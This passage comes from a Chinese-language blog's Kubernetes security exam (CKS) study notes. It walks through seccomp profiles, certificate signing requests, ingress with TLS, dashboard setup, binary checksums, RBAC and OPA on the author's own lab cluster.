--runtime-endpoint=/run/containerd/containerd.sock ps -q --name=gn)</span><br><span class=\"line\">sudo crictl --runtime-endpoint=/run/containerd/containerd.sock inspect $CONTAINER_ID | jq .info.runtimeSpec.linux.seccomp</span><br><span class=\"line\"># 返回</span><br><span class=\"line\">#&#123;</span><br><span class=\"line\">#  &quot;defaultAction&quot;: &quot;SCMP_ACT_ERRNO&quot;,</span><br><span class=\"line\">#  &quot;architectures&quot;: [</span><br><span class=\"line\">#    &quot;SCMP_ARCH_ARM&quot;,</span><br><span class=\"line\">#    &quot;SCMP_ARCH_AARCH64&quot;</span><br><span class=\"line\">#  ],</span><br><span class=\"line\">#  &quot;syscalls&quot;: [</span><br><span class=\"line\">#    &#123;</span><br><span class=\"line\">#      &quot;names&quot;: [</span><br><span class=\"line\">#        &quot;accept&quot;,</span><br><span class=\"line\">#        &quot;accept4&quot;,</span><br><span class=\"line\"># ......</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"seccomp-localhost\"><a href=\"#seccomp-localhost\" class=\"headerlink\" title=\"seccomp localhost\"></a>seccomp localhost</h2><p>上面看了如何使用默认的seccomp，那么如果使用自定义的seccomp呢，可以看下面的步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">文档：</span><br><span class=\"line\">https://kubernetes.io/docs/tutorials/clusters/seccomp/</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建/var/lib/kubelet/seccomp,这个是seccomp文件默认被查找的位置</span><br><span class=\"line\">mkdir /var/lib/kubelet/seccomp</span><br><span class=\"line\">cd /var/lib/kubelet/seccomp</span><br><span class=\"line\"></span><br><span class=\"line\"># 下载所需的seccomp文件，我们这个seccomp的作用的对syscall进行日志记录，不做syscall拦截</span><br><span class=\"line\">curl -L -o profiles/audit.json https://k8s.io/examples/pods/security/seccomp/profiles/audit.json</span><br><span class=\"line\">#curl -L -o profiles/violation.json https://k8s.io/examples/pods/security/seccomp/profiles/violation.json</span><br><span class=\"line\">#curl -L -o profiles/fine-grained.json https://k8s.io/examples/pods/security/seccomp/profiles/fine-grained.json</span><br><span class=\"line\">ls profiles</span><br><span class=\"line\"># audit.json  fine-grained.json  violation.json</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建pod的yaml，里面包含自定义seccom配置localhostProfile: profiles/audit.json</span><br><span class=\"line\">vi audit-log.yaml</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Pod</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: audit-pod</span><br><span class=\"line\">  labels:</span><br><span class=\"line\">    app: audit-pod</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  securityContext:</span><br><span class=\"line\">    seccompProfile:</span><br><span class=\"line\">      type: Localhost</span><br><span class=\"line\">      localhostProfile: profiles/audit.json</span><br><span class=\"line\">  containers:</span><br><span class=\"line\">  - name: test-container</span><br><span class=\"line\">    image: nginx</span><br><span class=\"line\">    </span><br><span class=\"line\"># 查看pod的ip:port</span><br><span class=\"line\">kubectl apply -f audit-log.yaml</span><br><span class=\"line\">kubectl expose pod audit-pod --type NodePort --port 80</span><br><span class=\"line\">kubectl get service audit-pod</span><br><span class=\"line\">NAME        TYPE       CLUSTER-IP    EXTERNAL-IP   PORT(S)        AGE</span><br><span class=\"line\">audit-pod   NodePort   10.20.162.9   &lt;none&gt;        80:31676/TCP   7s</span><br><span class=\"line\"></span><br><span class=\"line\"># 访问ip:port并查看日志</span><br><span class=\"line\">访问ip:port</span><br><span class=\"line\">curl 10.20.162.9</span><br><span class=\"line\">同时在另一个终端查看日志</span><br><span class=\"line\">tail -f /var/log/syslog</span><br><span class=\"line\">可以看到这些日志：</span><br><span class=\"line\">Dec 26 11:45:54 k8sserver2 kernel: [57795.753820] kauditd_printk_skb: 6 callbacks suppressed</span><br><span class=\"line\">Dec 26 11:45:54 k8sserver2 kernel: [57795.753832] audit: type=1326 audit(1640519154.116:2520): auid=4294967295 uid=101 gid=101 ses=4294967295 subj=cri-containerd.apparmor.d pid=21257 comm=&quot;nginx&quot; exe=&quot;/usr/sbin/nginx&quot; sig=0 arch=c00000b7 syscall=242 compat=0 ip=0xffffb7021d14 code=0x7ffc0000</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\">经过验证如果拿掉pod中seccompProfile配置，就不能看到日志。说明seccomp生效了。</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"privileges-risk\"><a href=\"#privileges-risk\" class=\"headerlink\" title=\"privileges risk\"></a>privileges risk</h2><p>这部分知识比较偏向攻击层面，而不是防守层面。我们是通过学习他的攻击方式来加强自己在配置权限时候的安全意识。同时实际考试中并没有这一块考到，所以不想看的可以跳过。</p>\n<p>存在权限风险的操作主要有4个：bind，escalate，impersonate，create pod。详细的分析和测试可以跳到<a href=\"https://yizhi.ren/2022/02/06/dangerousprivileges/\">k8s中的危险权限</a>查看。</p>\n<h2 id=\"podsecuritypolicy\"><a href=\"#podsecuritypolicy\" class=\"headerlink\" title=\"podsecuritypolicy\"></a>podsecuritypolicy</h2><p>psp是给pod增加约束的，定义哪些能做，作用范围大都是在securityContext这个结构中，其他也有，比如可以定义哪些volume是支持的，定义哪些端口是允许的。他通过限制这些结构来达到约束pod的目的。</p>\n<p>但是psp是一个即将被废弃的功能，如果你看到文章的时候k8s的版本已经出到了v1.25了那么你可以不用看这部分了，根据官方文档，psp会在v1.25被彻底拿掉。至于psp的继任者<a href=\"https://kubernetes.io/docs/concepts/security/pod-security-admission/\">Pod Security Admission</a>我会在后续补上，当前我安装的k8s版本还不能使用，要v1.22才能使用。</p>\n<p>详细的关于psp的解说和用法可以跳到<a href=\"https://yizhi.ren/2022/02/07/podsecuritypolicy/\">k8s中的PodSecurityPolicy</a>查看。</p>\n<h2 id=\"CSR-approve\"><a href=\"#CSR-approve\" class=\"headerlink\" title=\"CSR approve\"></a>CSR approve</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/tasks/tls/managing-tls-in-a-cluster/</span><br><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/#signers</span><br><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/#normal-user</span><br><span class=\"line\"></span><br><span class=\"line\">使用approve流程是因为集群的CA证书不应该随便拿来用，需要隐藏起来。</span><br><span class=\"line\">这个流程是controller manager完成证书签发的流程，controller manager使用这两个参数来配置用到的ca的key和cert：</span><br><span class=\"line\">- --cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt</span><br><span class=\"line\">- --cluster-signing-key-file=/etc/kubernetes/pki/ca.key</span><br></pre></td></tr></table></figure>\n\n<p>csr approve的步骤如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1.创建key</span><br><span class=\"line\">ubuntu@server2:~$ openssl genrsa -out myuser.key 2048</span><br><span class=\"line\">Generating RSA private key, 2048 bit long modulus (2 primes)</span><br><span class=\"line\">..............+++++</span><br><span class=\"line\">..+++++</span><br><span class=\"line\">e is 65537 (0x010001)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2.创建csr</span><br><span class=\"line\"># 这一步是交互形式的，你需要填的是Organization Name和Common Name，对应的是user的group和username，其他字段都可以不填，直接回车。这里我填的分别是system:groupx和yizhiren，你可以按需填。</span><br><span class=\"line\">ubuntu@server2:~$ openssl req -new -key myuser.key -out myuser.csr</span><br><span class=\"line\">You are about to be asked to enter information that will be incorporated</span><br><span class=\"line\">into your certificate request.</span><br><span class=\"line\">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class=\"line\">There are quite a few fields but you can leave some blank</span><br><span class=\"line\">For some fields there will be a default value,</span><br><span class=\"line\">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class=\"line\">-----</span><br><span class=\"line\">Country Name (2 letter code) [AU]:</span><br><span class=\"line\">State or Province Name (full name) [Some-State]:</span><br><span class=\"line\">Locality Name (eg, city) []:</span><br><span class=\"line\">Organization Name (eg, company) [Internet Widgits Pty Ltd]:system:groupx</span><br><span class=\"line\">Organizational Unit Name (eg, section) []:</span><br><span class=\"line\">Common Name (e.g. server FQDN or YOUR name) []:yizhiren</span><br><span class=\"line\">Email Address []:</span><br><span class=\"line\"></span><br><span class=\"line\">Please enter the following &#x27;extra&#x27; attributes</span><br><span class=\"line\">to be sent with your certificate request</span><br><span class=\"line\">A challenge password []:</span><br><span class=\"line\">An optional company name []:</span><br><span class=\"line\"></span><br><span class=\"line\"># 可以使用下面的命令查看生成的csr文件</span><br><span class=\"line\"># openssl req  -noout -text -in ./myuser.csr</span><br><span class=\"line\"># Certificate Request:</span><br><span class=\"line\"># ......</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. base64 myuser.csr</span><br><span class=\"line\">ubuntu@server2:~$ cat myuser.csr | base64 | tr -d &quot;\\n&quot;</span><br><span class=\"line\">xxxxxxxxxxxxxxxxxx</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 4. 创建csr yaml文件</span><br><span class=\"line\">vi csr.yaml</span><br><span class=\"line\"># 这里的request就是上面base64 myuser.csr值</span><br><span class=\"line\">apiVersion: certificates.k8s.io/v1</span><br><span class=\"line\">kind: CertificateSigningRequest</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: myuser</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  request: xxxxxxxxxxxxxxxxxx</span><br><span class=\"line\">  signerName: kubernetes.io/kube-apiserver-client</span><br><span class=\"line\">  expirationSeconds: 86400  # one day</span><br><span class=\"line\">  usages:</span><br><span class=\"line\">  - client auth</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"># 5. apply yaml</span><br><span class=\"line\">ubuntu@server2:~$ kl apply -f csr.yaml</span><br><span class=\"line\">certificatesigningrequest.certificates.k8s.io/myuser created</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 6. 查看csr</span><br><span class=\"line\">ubuntu@server2:~$ kl get csr</span><br><span class=\"line\">NAME     AGE     SIGNERNAME                            REQUESTOR          REQUESTEDDURATION   CONDITION</span><br><span class=\"line\">myuser   5m47s   kubernetes.io/kube-apiserver-client   kubernetes-admin   24h                 Pending</span><br><span class=\"line\"></span><br><span class=\"line\"># 7. approve csr</span><br><span class=\"line\">ubuntu@server2:~$ kl certificate approve myuser</span><br><span class=\"line\">certificatesigningrequest.certificates.k8s.io/myuser approved</span><br><span class=\"line\"></span><br><span class=\"line\"># 8. save crt</span><br><span class=\"line\">kl get csr myuser -o jsonpath=&#x27;&#123;.status.certificate&#125;&#x27;| base64 -d &gt; myuser.crt</span><br><span class=\"line\"></span><br><span class=\"line\"># 可以使用下面的命令查看生成的crt文件</span><br><span class=\"line\"># openssl x509  -noout -text -in ./myuser.crt</span><br><span class=\"line\"># Certificate:</span><br><span class=\"line\"># ......</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"ingress-usage\"><a href=\"#ingress-usage\" class=\"headerlink\" title=\"ingress usage\"></a>ingress usage</h2><p>ingress是对内部服务的代理，外部请求通过ingress再转发到svr中。</p>\n<p>我们做一个使用举例：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 首先创建3个svc：</span></span><br><span class=\"line\"></span><br><span class=\"line\">ubuntu@server2:~$ kl run ng1 --image nginx</span><br><span class=\"line\">pod/ng1 created</span><br><span class=\"line\">ubuntu@server2:~$ kl run ng2 --image nginx</span><br><span class=\"line\">pod/ng2 created</span><br><span class=\"line\">ubuntu@server2:~$ kl run ngdefault --image nginx</span><br><span class=\"line\">pod/ngdefault created</span><br><span class=\"line\">ubuntu@server2:~$ kl expose pod ng1 --name svr1 --port 80 --target-port 80</span><br><span class=\"line\">service/svr1 exposed</span><br><span class=\"line\">ubuntu@server2:~$ kl expose pod ng2 --name svr2 --port 80 --target-port 80</span><br><span class=\"line\">service/svr2 exposed</span><br><span class=\"line\">ubuntu@server2:~$ kl expose pod ngdefault --name svrdefault --port 80 --target-port 80</span><br><span class=\"line\">service/svrdefault exposed</span><br><span class=\"line\"></span><br><span class=\"line\">ubuntu@server2:~$ kl get svc</span><br><span class=\"line\">NAME         TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE</span><br><span class=\"line\">kubernetes   ClusterIP   10.20.0.1       &lt;none&gt;        443/TCP   12d</span><br><span class=\"line\">svr1         ClusterIP   10.20.22.214    &lt;none&gt;        80/TCP    88s</span><br><span class=\"line\">svr2         ClusterIP   10.20.191.98    &lt;none&gt;        80/TCP    81s</span><br><span class=\"line\">svrdefault   ClusterIP   10.20.215.248   &lt;none&gt;        80/TCP    55s</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 然后创建ingress yaml</span><br><span class=\"line\">vi ingress.yaml</span><br><span class=\"line\"># 注意rewrite-target和ingressClassName的配置</span><br><span class=\"line\"># nginx-controller的安装可在文章靠前的小节中查看。</span><br><span class=\"line\">apiVersion: networking.k8s.io/v1</span><br><span class=\"line\">kind: Ingress</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: simple-fanout-example</span><br><span class=\"line\">  annotations:</span><br><span class=\"line\">    nginx.ingress.kubernetes.io/rewrite-target:  /$2</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  ingressClassName: nginx</span><br><span class=\"line\">  defaultBackend:</span><br><span class=\"line\">    service:</span><br><span class=\"line\">      name: ngdefault</span><br><span class=\"line\">      port:</span><br><span class=\"line\">        number: 80</span><br><span class=\"line\">  rules:</span><br><span class=\"line\">  - host: jinqidiguo.com</span><br><span class=\"line\">    http:</span><br><span class=\"line\">      paths:</span><br><span class=\"line\">      - path: /svr1(/|$)(.*)</span><br><span class=\"line\">        pathType: Prefix</span><br><span class=\"line\">        backend:</span><br><span class=\"line\">          service:</span><br><span class=\"line\">            name: svr1</span><br><span class=\"line\">            port:</span><br><span class=\"line\">              number: 80</span><br><span class=\"line\">      - path: /svr2(/|$)(.*)</span><br><span class=\"line\">        pathType: Prefix</span><br><span class=\"line\">        backend:</span><br><span class=\"line\">          service:</span><br><span class=\"line\">            name: svr2</span><br><span class=\"line\">            port:</span><br><span class=\"line\">              number: 80</span><br><span class=\"line\">              </span><br><span class=\"line\"># 然后apply </span><br><span class=\"line\">~$ kl apply -f ingress.yaml</span><br><span class=\"line\">ingress.networking.k8s.io/simple-fanout-example created</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后我们访问svr1和svr2:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 查看nginx-controller的ip</span><br><span class=\"line\">ubuntu@server2:~$ kl get svc ingress-nginx-controller -n ingress-nginx</span><br><span class=\"line\">NAME                       TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)                      AGE</span><br><span class=\"line\">ingress-nginx-controller   NodePort   10.20.148.137   &lt;none&gt;        80:31724/TCP,443:31447/TCP   4d3h</span><br><span class=\"line\"></span><br><span class=\"line\"># 访问svr2</span><br><span class=\"line\">ubuntu@server2:~$ curl 10.20.148.137/svr2/index.html -H &#x27;Host: jinqidiguo.com&#x27;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">html &#123; color-scheme: light dark; &#125;</span><br><span class=\"line\">body &#123; width: 35em; margin: 0 auto;</span><br><span class=\"line\">font-family: Tahoma, Verdana, Arial, sans-serif; &#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class=\"line\">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class=\"line\">working. Further configuration is required.&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p&gt;For online documentation and support please refer to</span><br><span class=\"line\">&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class=\"line\">Commercial support is available at</span><br><span class=\"line\">&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"ingress-tls\"><a href=\"#ingress-tls\" class=\"headerlink\" title=\"ingress tls\"></a>ingress tls</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">资料：</span><br><span class=\"line\">https://docs.microsoft.com/en-us/azure/aks/ingress-own-tls</span><br><span class=\"line\">https://kubernetes.io/docs/concepts/services-networking/ingress/#tls</span><br><span class=\"line\">https://kubernetes.io/docs/concepts/configuration/secret/#tls-secrets</span><br></pre></td></tr></table></figure>\n\n<p>上小节我们配置了ingress，此时ingress我们发现已经支持https了。但不是我们自己定义的证书。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ curl https://jinqidiguo.com/svr1 -k -v --resolve jinqidiguo.com:443:10.20.148.137</span><br><span class=\"line\">...</span><br><span class=\"line\">*  issuer: O=Acme Co; CN=Kubernetes Ingress Controller Fake Certificate</span><br><span class=\"line\">...</span><br><span class=\"line\">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>但是可以看到这时候的服务端证书是默认的一个证书”Kubernetes Ingress Controller Fake Certificate“。</p>\n<p>我们这里需要做的是自定义我们自己的证书。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 首先创建证书，这里使用ca文件直接签。</span><br><span class=\"line\"># 你也可以使用csr流程来签发，参考链接：https://kubernetes.io/docs/tasks/tls/managing-tls-in-a-cluster/</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建csr.conf</span><br><span class=\"line\">vi ingress-csr.conf</span><br><span class=\"line\">[ req ]</span><br><span class=\"line\">default_bits = 2048</span><br><span class=\"line\">prompt = no</span><br><span class=\"line\">default_md = sha256</span><br><span class=\"line\">req_extensions = req_ext</span><br><span class=\"line\">distinguished_name = dn</span><br><span class=\"line\"></span><br><span class=\"line\">[ dn ]</span><br><span class=\"line\">O = ingress-server</span><br><span class=\"line\">CN = jinqidiguo.com</span><br><span class=\"line\"></span><br><span class=\"line\">[ req_ext ]</span><br><span class=\"line\">subjectAltName = @alt_names</span><br><span class=\"line\"></span><br><span class=\"line\">[ alt_names ]</span><br><span class=\"line\">DNS.1 = jinqidiguo.com</span><br><span class=\"line\">IP.1 = 10.20.148.137</span><br><span class=\"line\"></span><br><span class=\"line\">[ v3_ext ]</span><br><span class=\"line\">authorityKeyIdentifier=keyid,issuer:always</span><br><span class=\"line\">basicConstraints=CA:FALSE</span><br><span class=\"line\">keyUsage=keyEncipherment,dataEncipherment</span><br><span class=\"line\">extendedKeyUsage=serverAuth</span><br><span class=\"line\">subjectAltName=@alt_names</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建key</span><br><span class=\"line\">openssl genrsa -out ingress-server.key 2048</span><br><span class=\"line\"># 创建csr</span><br><span class=\"line\">openssl req -new -key ingress-server.key -out ingress-server.csr -config ingress-csr.conf</span><br><span class=\"line\"># 创建cert</span><br><span class=\"line\">sudo openssl x509 -req -in ingress-server.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out ingress-server.crt -days 366 -extensions v3_ext -extfile ingress-csr.conf</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们得到了两个有用的文件ingress-server.crt和ingress-server.key。</p>\n<p>然后创建secret，secret中保存我们创建出来的证书和key。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kl create secret tls ingress-tls-secret --cert=ingress-server.crt --key=ingress-server.key</span><br></pre></td></tr></table></figure>\n\n<p>然后编辑ingress, 插入secret配置。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ vi ingress.yaml</span><br><span class=\"line\"># 插入tls字段</span><br><span class=\"line\">apiVersion: networking.k8s.io/v1</span><br><span class=\"line\">kind: Ingress</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: simple-fanout-example</span><br><span class=\"line\">  annotations:</span><br><span class=\"line\">    nginx.ingress.kubernetes.io/rewrite-target:  /$2</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  ingressClassName: nginx</span><br><span class=\"line\">  tls:</span><br><span class=\"line\">  - hosts:</span><br><span class=\"line\">    - jinqidiguo.com</span><br><span class=\"line\">    secretName: ingress-tls-secret</span><br><span class=\"line\">  defaultBackend:</span><br><span class=\"line\">    service:</span><br><span class=\"line\">      name: ngdefault</span><br><span class=\"line\">      port:</span><br><span class=\"line\">        number: 80</span><br><span class=\"line\">  rules:</span><br><span class=\"line\">  - host: jinqidiguo.com</span><br><span class=\"line\">    http:</span><br><span class=\"line\">      paths:</span><br><span class=\"line\">      - path: /svr1(/|$)(.*)</span><br><span class=\"line\">        pathType: Prefix</span><br><span class=\"line\">        backend:</span><br><span class=\"line\">          service:</span><br><span class=\"line\">            name: svr1</span><br><span class=\"line\">            port:</span><br><span class=\"line\">              number: 80</span><br><span class=\"line\">      - path: /svr2(/|$)(.*)</span><br><span class=\"line\">        pathType: Prefix</span><br><span class=\"line\">        backend:</span><br><span class=\"line\">          service:</span><br><span class=\"line\">            name: svr2</span><br><span class=\"line\">            port:</span><br><span class=\"line\">              number: 80</span><br><span class=\"line\">        </span><br><span class=\"line\">    </span><br><span class=\"line\"># 然后apply</span><br><span class=\"line\">~$ kl apply -f ingress.yaml </span><br><span class=\"line\">ingress.networking.k8s.io/simple-fanout-example configured</span><br></pre></td></tr></table></figure>\n\n<p>然后我们再来测试https访问：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ curl https://jinqidiguo.com/svr1 -k -v --resolve jinqidiguo.com:443:10.20.148.137</span><br><span class=\"line\">...</span><br><span class=\"line\">*  subject: O=ingress-server; CN=jinqidiguo.com</span><br><span class=\"line\">...</span><br><span class=\"line\">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到证书已经改成我们自己的信息了。</p>\n<h2 id=\"dashboard\"><a href=\"#dashboard\" class=\"headerlink\" title=\"dashboard\"></a>dashboard</h2><p>dashboard用来可视化管理集群，这里记录下如何安装并访问dashboard。主要是两个步骤，一个是安装dasshboard，一个是创建一个用户专门来访问dashboard。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 文档</span><br><span class=\"line\">https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/#deploying-the-dashboard-ui</span><br><span class=\"line\">https://github.com/kubernetes/dashboard/blob/master/docs/user/access-control/creating-sample-user.md</span><br><span class=\"line\"></span><br><span class=\"line\"># deploy dashboard</span><br><span class=\"line\">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml</span><br><span class=\"line\"></span><br><span class=\"line\"># create user</span><br><span class=\"line\">vi dashboard-user.yaml</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: ServiceAccount</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: dashboard-admin-user</span><br><span class=\"line\">  namespace: kubernetes-dashboard</span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRoleBinding</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: dashboard-admin-user</span><br><span class=\"line\">roleRef:</span><br><span class=\"line\">  apiGroup: rbac.authorization.k8s.io</span><br><span class=\"line\">  kind: ClusterRole</span><br><span class=\"line\">  name: cluster-admin</span><br><span class=\"line\">subjects:</span><br><span class=\"line\">- kind: ServiceAccount</span><br><span class=\"line\">  name: dashboard-admin-user</span><br><span class=\"line\">  namespace: kubernetes-dashboard</span><br><span class=\"line\"></span><br><span class=\"line\">kl apply -f dashboard-user.yaml</span><br><span class=\"line\"></span><br><span class=\"line\"># get token from secret from serviceaccount</span><br><span class=\"line\">kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/dashboard-admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># visit</span><br><span class=\"line\">kubectl proxy</span><br><span class=\"line\">http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/</span><br><span class=\"line\"># copy token to the page to login</span><br></pre></td></tr></table></figure>\n\n<p>注意考试中有考到修改dashboard参数的，可以参考页面：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/kubernetes/dashboard/blob/36e967d848006dee386355c26f392f9045bc8f3d/docs/common/dashboard-arguments.md</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"checksum\"><a href=\"#checksum\" class=\"headerlink\" title=\"checksum\"></a>checksum</h2><p>为了确认已经安装的或者即将安装的二进制文件是官方提供的，我们需要检查二进制文件的摘要信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">goto </span><br><span class=\"line\">https://github.com/kubernetes/kubernetes/tree/master/CHANGELOG</span><br><span class=\"line\">to visit change log of your k8s version</span><br><span class=\"line\"></span><br><span class=\"line\">然后下载指定版本的包，然后检查官方包的bin的shasum值</span><br><span class=\"line\">bin % shasum kubelet</span><br><span class=\"line\">97d45554c6451b9d6b17c51704ef87d3bd0abd3c  kubelet</span><br><span class=\"line\">bin % shasum kubectl</span><br><span class=\"line\">6ab51e83360217648c863d1f78871af806d943d5  kubectl</span><br><span class=\"line\">bin % shasum kubeadm</span><br><span class=\"line\">dd59c05cf549a446e3aa1e56178be110670319bd  kubeadm</span><br><span class=\"line\"></span><br><span class=\"line\">然后检查server中安装的bin的shasum</span><br><span class=\"line\">server2:~# shasum /usr/bin/kubelet</span><br><span class=\"line\">97d45554c6451b9d6b17c51704ef87d3bd0abd3c  /usr/bin/kubelet</span><br><span class=\"line\">server2:~# shasum /usr/bin/kubectl</span><br><span class=\"line\">6ab51e83360217648c863d1f78871af806d943d5  /usr/bin/kubectl</span><br><span class=\"line\">server2:~# shasum /usr/bin/kubeadm</span><br><span class=\"line\">dd59c05cf549a446e3aa1e56178be110670319bd  /usr/bin/kubeadm</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"RBAC\"><a href=\"#RBAC\" class=\"headerlink\" title=\"RBAC\"></a>RBAC</h2><p>rbac是k8s内部的权限管理机制，他主要有4中角色组成，user代表用户，operation代表操作行为，role代表一组operation的集合，binding关联一组user和一个role。从user到binding再到role再到operation，凡是这条线能关联上的就代表user拥有这个operation的权限。</p>\n<p><img src=\"/linkimage/cksknowledge/rbac-link.png\" alt=\"rbac角色\"></p>\n<p>图片来自<a href=\"https://dominik-tornow.medium.com/inside-kubernetes-rbac-9988b08a738a\">Kubernetes Role-based Authorization</a></p>\n<p>RBAC起作用的阶段是在认证（Authentication）之后, 在授权（Authorization）阶段起作用。</p>\n<p><img src=\"/linkimage/cksknowledge/rbac-authorization.png\" alt=\"rbac角色\"></p>\n<p>图片来自<a href=\"https://dominik-tornow.medium.com/inside-kubernetes-rbac-9988b08a738a\">Inside Kubernetes RBAC</a></p>\n<p>那RBAC需要学些什么呢，事实上RBAC这部分知识是跟CKA考试重叠的，我们需要注意的是在分配权限的时候要注意收缩权限，按照最小权限的原则去分配权限。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">另外列一些RBAC相关的很好的网站（不看不影响考试）:</span><br><span class=\"line\">https://rbac.dev/ # 这个网站很棒，收集了大量rbac的好文章</span><br><span class=\"line\">https://dominik-tornow.medium.com/inside-kubernetes-rbac-9988b08a738a</span><br><span class=\"line\">https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"OPA-Open-Policy-Agent\"><a href=\"#OPA-Open-Policy-Agent\" class=\"headerlink\" title=\"OPA(Open Policy Agent)\"></a>OPA(Open Policy Agent)</h2><p>OPA是用来替代PSP的一个方案，OPA也称作Gatekeeper v1.0。</p>\n<p>OPA的使用太过繁琐了，需要好多手工活。不建议学习了，考试考到的也是基于OPA的GateKeeper v3.0，所以我们可以直接学Gatekeeper v3.0.</p>\n<p>如果实在想亲手尝试，可以联系我，我可以贴上来yaml和步骤，或者照着这个文档走：</p>\n<figure class=\"highlight plaintext\"><table><tr><td 